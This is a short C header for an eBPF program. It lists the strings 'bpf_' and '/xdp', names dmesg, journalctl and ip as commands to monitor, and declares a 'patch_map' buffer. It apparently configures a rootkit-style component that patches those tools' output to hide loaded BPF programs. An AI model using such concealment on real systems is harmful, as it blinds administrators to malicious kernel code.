#pragma once
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>

#define MAX_BUF 200
#define MAX_PATTERNS 3
#define MAX_PATTERN_LEN 32
#define PATCH_KEY 0
#define MAX_COMMANDS 3
#define MAX_COMMAND_LEN 16

typedef struct {
    char pattern[MAX_PATTERN_LEN];
    uint32_t len;
} StaticPattern;

typedef struct {
    char command[MAX_COMMAND_LEN];
    uint32_t len;
} StaticCommand;

// You can add more patterns here
const StaticPattern patterns[MAX_PATTERNS] = {
    { "bpf_", sizeof("bpf_") - 1 },
    { "/xdp", sizeof("/xdp") - 1 }
};

// Commands to monitor
const StaticCommand commands[MAX_COMMANDS] = {
    { "dmesg", sizeof("dmesg") - 1 },
    { "journalctl", sizeof("journalctl") - 1 },
    { "ip", sizeof("ip") - 1 }
};

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, char[MAX_BUF]);
} patch_map SEC(".maps");